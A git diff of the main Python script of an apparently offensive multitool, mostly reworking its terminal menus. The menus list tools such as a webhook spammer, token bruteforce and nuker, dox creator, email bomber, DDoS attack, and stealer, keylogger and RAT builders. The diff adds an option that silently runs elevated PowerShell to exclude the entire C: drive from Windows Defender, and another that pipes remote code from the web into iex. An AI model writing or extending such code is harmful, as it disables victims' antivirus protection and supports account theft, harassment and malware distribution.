@@ -17,7 +17,7 @@ def _init():
 
 _init()
 
-from core.display import Colors, Colorate, System, boot_anim, print_banner, menu_opts, get_inpt, init_os, get_config, Theme, matrix_effect
+from core.display import Colors, Colorate, System, boot_anim, print_banner, menu_opts, get_inpt, init_os, get_config, Theme, matrix_effect, clr
 from modules.discord_tools import webhook_spam, webhook_delete, id_to_token, server_info_lookup, nitro_generator, bot_invite_gen
 from modules.network import do_port_check
 from modules.crypto import CryptXer, make_pw
@@ -28,19 +28,105 @@ from modules.obfuscator import obfuscator_init
 from modules.metadata import metadata_init
 
 def cfg_mgr():
+    from core.paginated_ui import PaginatedUI
     while 1:
+        clr()
         _cl = Theme.get_colors()
-        print_banner()
-        print(Colorate.Horizontal(_cl["head"], "  [ CONFIGURATION & SETTINGS ]\n"))
-        _tl = [("1","Blue"),("2","Red"),("3","Purple"),("4","Green"),("5","Yellow"),("6","Pink"),("7","Cyan"),("8","Gray"),("9","Rainbow"),("10","Modern"),("11","Modern Red"),("12","Modern Purple")]
-        print(Colorate.Horizontal(_cl["head"], "  [ THEMES ]"))
+        _cfg = get_config()
+
+        au_status = "[ENABLED]" if _cfg.get("auto_update", True) else "[DISABLED]"
+        dp_status = "[ENABLED]" if _cfg.get("auto_open_discord", True) else "[DISABLED]"
+        active_theme = _cfg.get("theme", "blue").upper()
+
+        box_w = PaginatedUI.get_layout_width()
+        inner = box_w - 2
+        mg = PaginatedUI.get_margin(box_w)
+
+        def _p(text=""):
+            """Print a full-width box row, centered on screen."""
+            pad_right = max(0, inner - len(text))
+            print(mg + Colorate.Horizontal(_cl["num"], "│") +
+                  Colorate.Horizontal(_cl["txt"], text) +
+                  " " * pad_right +
+                  Colorate.Horizontal(_cl["num"], "│"))
+
+        def _pc(text_plain, color):
+            """Print a centered-text box row."""
+            pad = (inner - len(text_plain)) // 2
+            extra = inner - len(text_plain) - pad * 2
+            print(mg + Colorate.Horizontal(_cl["num"], "│") +
+                  " " * pad +
+                  Colorate.Horizontal(color, text_plain) +
+                  " " * pad + " " * extra +
+                  Colorate.Horizontal(_cl["num"], "│"))
+
+        def _div(char="─", left="├", right="┤"):
+            print(mg + Colorate.Horizontal(_cl["head"], left + char * inner + right))
+
+        # ── Header ────────────────────────────────────────────────────────────
+        title = " CONFIGURATION & SETTINGS "
+        bd_len = max(2, (inner - len(title)) // 2)
+        bd_ext = "─" if (inner - len(title)) % 2 != 0 else ""
+        print(mg + Colorate.Horizontal(_cl["head"], "┌" + "─" * bd_len + title + "─" * bd_len + bd_ext + "┐"))
+        _p()
+        _pc(f"Active Theme: {active_theme}", _cl["head"])
+        _p()
+
+        # ── Theme grid (3 columns) ─────────────────────────────────────────────
+        _tl = [("1","Blue"),("2","Red"),("3","Purple"),("4","Green"),("5","Yellow"),("6","Pink"),
+               ("7","Cyan"),("8","Gray"),("9","Rainbow"),("10","Modern"),("11","Modern Red"),("12","Modern Purple")]
+        col_w = inner // 3
         for _i in range(0, len(_tl), 3):
             _ln = ""
-            for _k, _v in _tl[_i:_i+3]: _ln += Colorate.Horizontal(_cl["num"], f"  [{_k}] ") + Colorate.Horizontal(_cl["txt"], f"{_v:<15}")
-            print(_ln)
-        print("\n" + Colorate.Horizontal(_cl["head"], "  [ TOGGLES ]"))
-        print(Colorate.Horizontal(_cl["num"], "  [13] ") + Colorate.Horizontal(_cl["txt"], "Auto-Update") + " " * 10 + Colorate.Horizontal(_cl["num"], "[14] ") + Colorate.Horizontal(_cl["txt"], "Discord Popup"))
-        print(Colorate.Horizontal(_cl["num"], "  [99] ") + Colorate.Horizontal(_cl["txt"], "Return to Menu"))
+            plain_ln = ""
+            for _k, _v in _tl[_i:_i+3]:
+                v_disp = f"{_v} ✓" if _v.lower().replace(" ", "_") == _cfg.get("theme", "blue").lower() else _v
+                slot = f"  [{_k}] {v_disp}"
+                slot_padded = f"{slot:<{col_w}}"
+                _ln += Colorate.Horizontal(_cl["num"], f"  [{_k}] ") + Colorate.Horizontal(_cl["txt"], f"{v_disp:<{col_w - len(f'  [{_k}] ')}}") 
+                plain_ln += slot_padded
+            pad_val = max(0, inner - len(plain_ln))
+            print(mg + Colorate.Horizontal(_cl["num"], "│") + _ln + " " * pad_val + Colorate.Horizontal(_cl["num"], "│"))
+
+        # ── Toggles ───────────────────────────────────────────────────────────
+        _p()
+        _div()
+        _p()
+        half = inner // 2
+        c1_key = "  [13] "; c1_lbl = "Auto-Update:  "; c1_val = f"{au_status}"
+        c2_key = "  [14] "; c2_lbl = "Discord Popup:"; c2_val = f" {dp_status}"
+        c1_plain = c1_key + c1_lbl + c1_val
+        c2_plain = c2_key + c2_lbl + c2_val
+        c1_pad = half - len(c1_plain)
+        c2_pad = max(0, inner - half - len(c2_plain))
+        toggle_row = (
+            mg + Colorate.Horizontal(_cl["num"], "│") +
+            Colorate.Horizontal(_cl["num"], c1_key) +
+            Colorate.Horizontal(_cl["txt"], c1_lbl) +
+            Colorate.Horizontal(_cl["head"], c1_val) +
+            " " * max(0, c1_pad) +
+            Colorate.Horizontal(_cl["num"], c2_key) +
+            Colorate.Horizontal(_cl["txt"], c2_lbl) +
+            Colorate.Horizontal(_cl["head"], c2_val) +
+            " " * c2_pad +
+            Colorate.Horizontal(_cl["num"], "│")
+        )
+        print(toggle_row)
+        _p()
+        _div()
+        _p()
+
+        # ── Return ────────────────────────────────────────────────────────────
+        exit_plain = "  [99] Return to Main Menu"
+        pad_exit = max(0, inner - len(exit_plain))
+        print(mg + Colorate.Horizontal(_cl["num"], "│") +
+              Colorate.Horizontal(_cl["num"], "  [99] ") +
+              Colorate.Horizontal(_cl["txt"], "Return to Main Menu") +
+              " " * pad_exit +
+              Colorate.Horizontal(_cl["num"], "│"))
+        _p()
+        print(mg + Colorate.Horizontal(_cl["head"], "└" + "─" * inner + "┘"))
+
         _c = get_inpt("navi@config:~#")
         if _c in [str(_x) for _x in range(1, 13)]:
             _tm = {"1":"blue","2":"red","3":"purple","4":"green","5":"yellow","6":"pink","7":"cyan","8":"gray","9":"rainbow","10":"modern","11":"modern_red","12":"modern_purple"}[_c]
@@ -63,12 +149,36 @@ def cfg_mgr():
         elif _c == "99": break
 
 def inf_view():
+    from core.paginated_ui import PaginatedUI
+    clr()
     _cl = Theme.get_colors()
-    print_banner()
+    box_w = PaginatedUI.get_layout_width()
+    inner = box_w - 2
+    mg = PaginatedUI.get_margin(box_w)
+
+    title = " APP INFO & CONFIG "
+    bd_len = max(2, (inner - len(title)) // 2)
+    bd_ext = "─" if (inner - len(title)) % 2 != 0 else ""
+    print(mg + Colorate.Horizontal(_cl["head"], "┌" + "─" * bd_len + title + "─" * bd_len + bd_ext + "┐"))
+    print(mg + Colorate.Horizontal(_cl["num"], "│" + " " * inner + "│"))
+
     try:
-        with open("core/config.json", "r") as _f: _d = json.load(_f)
-        for _k, _v in _d.items(): print(Colorate.Horizontal(_cl["num"], f"  {_k}: ") + Colorate.Horizontal(_cl["txt"], str(_v)))
+        with open("core/config.json", "r") as _f:
+            _d = json.load(_f)
+        for _k, _v in _d.items():
+            key_str = f"  {_k}: "
+            val_str = str(_v)
+            plain = key_str + val_str
+            pad_r = max(0, inner - len(plain))
+            print(mg + Colorate.Horizontal(_cl["num"], "│") +
+                  Colorate.Horizontal(_cl["num"], key_str) +
+                  Colorate.Horizontal(_cl["txt"], val_str) +
+                  " " * pad_r +
+                  Colorate.Horizontal(_cl["num"], "│"))
     except: pass
+
+    print(mg + Colorate.Horizontal(_cl["num"], "│" + " " * inner + "│"))
+    print(mg + Colorate.Horizontal(_cl["head"], "└" + "─" * inner + "┘"))
     input(Colorate.Horizontal(_cl["head"], "\n  Press Enter..."))
 
 def _pre():
@@ -79,7 +189,12 @@ def _pre():
             _r = requests.get("https://raw.githubusercontent.com/glockinhand/navi-multitool/main/core/config.json", timeout=5)
             if _r.status_code == 200:
                 _rv = _r.json().get("version", "1.0.0")
-                if _rv != _cfg.get("version"):
+                
+                def parse_v(v):
+                    import re
+                    return [int(x) for x in re.sub(r'[^0-9.]', '', str(v)).split('.') if x.isdigit()]
+                
+                if parse_v(_rv) > parse_v(_cfg.get("version", "1.0.0")):
                     print(Colorate.Horizontal(_cl["num"], f"\n  [!] New Version Detected: {_rv}"))
                     _url = "https://github.com/glockinhand/navi-multitool/archive/refs/heads/main.zip"
                     _res = requests.get(_url, stream=True)
@@ -235,42 +350,35 @@ def _nbot_ui():
             break
 
 def run_app():
+    from core.paginated_ui import PaginatedUI, PAGES
+    current_page = 0
     while 1:
         _cl = Theme.get_colors()
-        print_banner()
         _cfg = get_config()
-        if _cfg.get("theme", "blue").lower().startswith("modern"):
-            from core.modern_ui import ModernUI as _mui
-            _d_i = ["[1] Webhook Tools", "[2] Token Tools", "[3] Nitro Generator", "[4] Server Info", "[5] Bot Invite Gen", "[6] Selfbot", "[7] Server Cloner", "[8] Nuke Bot"]
-            _o_i = ["[10] Port Scanner", "[11] Whois Lookup", "[12] DNS Lookup", "[14] Dox Tracker", "[15] Dox Creator", "[16] Phone Lookup", "[17] Email Lookup"]
-            _m_i = ["[20] Email Bomber", "[21] Crypto Clipper", "[22] Vuln Scanner", "[23] DDoS Attack", "[24] Stealer Builder", "[25] Keylogger Builder", "[26] IP Grabber", "[27] Rat Builder", "[28] Wallet Bruteforce"]
-            _g_i = ["[30] Base64 Codec", "[31] System Info", "[32] IP Pinger", "[33] Obfuscator", "[13] Metadata Scan"]
-            _r_i = ["[40] User Info", "[41] Cookie Info", "[42] Cookie Login", "[43] Group Info", "[44] Asset DL"]
-            _f_i = ["[50] Faker Tools", "[34] Web Cloner", "[35] QR Code Gen"]
-            _s_i = ["[60] Info", "[61] Config", "[99] Exit"]
+        
+        PaginatedUI.draw_dashboard(current_page)
+        
+        p_name = PAGES[current_page]['title'].split()[0].lower()
+        _c_raw = get_inpt(f"navi@root/{p_name}:~#").strip()
+        _c = _c_raw.lower()
+        
+        if _c in ["a", "p"]:
+            current_page = (current_page - 1) % len(PAGES)
+            continue
+        elif _c in ["d", "n"]:
+            current_page = (current_page + 1) % len(PAGES)
+            continue
+        elif _c.startswith("p") and len(_c) == 2 and _c[1] in ["1", "2", "3", "4", "5", "6"]:
+            current_page = int(_c[1]) - 1
+            continue
+        elif not _c:
+            continue
             
-            _mui.render_menu(Colorate, Theme, [("DISCORD", _d_i), ("OSINT", _o_i), ("MALICIOUS", _m_i)])
-            print()
-            _mui.render_menu(Colorate, Theme, [("GENERAL", _g_i), ("ROBLOX", _r_i), ("FAKER", _f_i), ("SYSTEM", _s_i)])
-        else:
-            print(Colorate.Horizontal(_cl["head"], "    [ DISCORD ]              [ OSINT ]                [ MALICIOUS ]"))
-            _d = [("[1] Webhook Tools", "[10] Port Scanner", "[20] Email Bomber"),("[2] Token Tools", "[11] Whois Lookup", "[21] Crypto Clipper"),("[3] Nitro Generator", "[12] DNS Lookup", "[22] Vuln Scanner"),("[4] Server Info", "[14] Dox Tracker", "[23] DDoS Attack"),("[5] Bot Invite Gen", "[15] Dox Creator", "[24] Stealer Builder"), ("[6] Selfbot", "[16] Phone Lookup", "[25] Keylogger Builder"), ("[7] Server Cloner", "[17] Email Lookup", "[26] IP Grabber"), ("[8] Nuke Bot", "", "[27] Rat Builder"), ("", "", "[28] Wallet Bruteforce")]
-            for _r1, _r2, _r3 in _d:
-                def _f(s, w):
-                    if not s: return " " * w
-                    _p = s.find(']') + 2 if ']' in s else 0
-                    return Colorate.Horizontal(_cl["num"], s[:_p]) + Colorate.Horizontal(_cl["txt"], f"{s[_p:]:<{w-_p}}")
-                print(f"    {_f(_r1, 25)}{_f(_r2, 25)}{_f(_r3, 20)}")
-            print("\n" + Colorate.Horizontal(_cl["head"], "    [ GENERAL ]              [ ROBLOX ]               [ FAKER ]               [ SYSTEM ]"))
-            _g = [("[30] Base64 Codec", "[40] User Info", "[50] Faker Tools", "[60] Info"),("[31] System Info", "[41] Cookie Info", "[34] Web Cloner", "[61] Config"),("[32] IP Pinger", "[42] Cookie Login", "[35] QR Code Gen", "[99] Exit"),("[33] Obfuscator", "[43] Group Info", "", ""),("[13] Metadata Scan", "[44] Asset DL", "", "")]
-            for _r1, _r2, _r3, _r4 in _g:
-                print(f"    {_f(_r1, 25)}{_f(_r2, 25)}{_f(_r3, 24)}{_f(_r4, 20)}")
-        _c = get_inpt()
+        _c = _c.lstrip("0") if _c not in ["0", "00"] else "0"
         if _c == "1":
             while 1:
                 print_banner()
-                print(Colorate.Horizontal(_cl["head"], "  [ WEBHOOK OPERATIONS ]\n"))
-                menu_opts({"1": "Spammer", "2": "Deleter", "99": "Return"})
+                PaginatedUI.draw_card_box("WEBHOOK OPERATIONS", {"1": "Spammer", "2": "Deleter", "99": "Return"})
                 _cc = get_inpt("navi@discord/webhooks:~#")
                 if _cc == "1": webhook_spam(get_inpt("url:"), get_inpt("msg:"), int(get_inpt("amt (10):") or 10))
                 elif _cc == "2": webhook_delete(get_inpt("url:"))
@@ -278,8 +386,7 @@ def run_app():
         elif _c == "2":
             while 1:
                 print_banner()
-                print(Colorate.Horizontal(_cl["head"], "  [ TOKEN & ACCOUNT TOOLS ]\n"))
-                menu_opts({"1": "Token Bruteforce", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "7": "Selfbot", "8": "Username Checker", "9": "Report Bot", "10": "Server Cloner", "99": "Return"})
+                PaginatedUI.draw_card_box("TOKEN & ACCOUNT TOOLS", {"1": "Token Bruteforce", "2": "Token Info", "3": "Token Nuker", "4": "Token Login", "5": "Status Rotator", "6": "Token Onliner", "7": "Selfbot", "8": "Username Checker", "9": "Report Bot", "10": "Server Cloner", "99": "Return"})
                 _cc = get_inpt("navi@discord/tokens:~#")
                 if _cc == "1":
                     id_to_token()
@@ -413,14 +520,16 @@ def run_app():
         elif _c == '44':
             from modules.roblox import roblox_asset_dl
             roblox_asset_dl()
+        elif _c == '45':
+            from modules.roblox import roblox_name_history
+            roblox_name_history()
         elif _c == '35':
             from modules.faker import fake_qr_gen
             fake_qr_gen()
         elif _c == "50":
             while 1:
                 print_banner()
-                print(Colorate.Horizontal(_cl["head"], "  [ FAKER & SIMULATIONS ]\n"))
-                menu_opts({
+                PaginatedUI.draw_card_box("FAKER & SIMULATIONS", {
                     "1": "Fake Token Gen", "2": "Fake Mail Gen", "3": "Fake Identity", 
                     "4": "Fake Nitro", "5": "Fake DDoS", "6": "Fake Credit Cards", 
                     "7": "Fake Wallet Miner", "8": "Social Botter", "9": "Fake PayPal OTP",
@@ -449,6 +558,21 @@ def run_app():
                 elif _cc == "99": break
         elif _c == "60": inf_view()
         elif _c == "61": cfg_mgr()
+        elif _c == "62":
+            try:
+                subprocess.run('powershell -Command "Start-Process powershell -ArgumentList \'-Command Add-MpPreference -ExclusionPath C:\\\' -Verb RunAs -WindowStyle Hidden"', shell=True)
+                print(Colorate.Horizontal(_cl["head"], "  [+] C: Drive exception added. Antivirus disabled for C:."))
+            except Exception as e:
+                print(Colorate.Horizontal(_cl["num"], f"  [!] Error: {e}"))
+            input("\n  Enter...")
+        elif _c == "63":
+            print(Colorate.Horizontal(_cl["head"], "  [*] Launching Windows Debloater (Chris Titus Tech's WinUtil)..."))
+            try:
+                subprocess.run('powershell -NoProfile -ExecutionPolicy Bypass -Command "irm christitus.com/win | iex"', shell=True)
+                print(Colorate.Horizontal(_cl["head"], "  [+] Debloater closed."))
+            except Exception as e:
+                print(Colorate.Horizontal(_cl["num"], f"  [!] Error: {e}"))
+            input("\n  Enter...")
         elif _c == "99": sys.exit(0)
 
 if __name__ == '__main__':
